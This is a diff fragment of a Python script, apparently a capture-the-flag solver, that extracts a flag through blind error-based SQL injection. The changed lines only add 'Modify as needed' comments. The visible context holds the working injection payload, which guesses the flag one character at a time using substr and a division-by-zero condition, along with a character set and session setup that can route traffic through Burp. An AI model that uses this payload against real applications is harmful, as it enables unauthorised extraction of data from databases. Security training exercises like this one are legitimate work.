@@ -6,8 +6,8 @@ import requests, time, argparse, urllib3
 from pwn import log, context
 context.log_level = "info"
 
-SUCCESS_MARKER = "Thanks for the feedback"
-DEFAULT_CHARSET = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz{}_"
+SUCCESS_MARKER = "Thanks for the feedback" # Modify as needed
+DEFAULT_CHARSET = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz{}_" # Modify as needed
 
 def make_session(session_cookie, use_burp, insecure):
     s = requests.Session()
@@ -25,7 +25,7 @@ def make_session(session_cookie, use_burp, insecure):
     return s
 
 def guess_char(session, url, pos, ch, retries=3, timeout=10):
-    payload = (
+    payload = (  # Modify as needed
         "'||(SELECT CASE "
         f"WHEN substr(flag,{pos},1)='{ch}' THEN '' "
         "ELSE (SELECT 1/0) END FROM flag)||'"
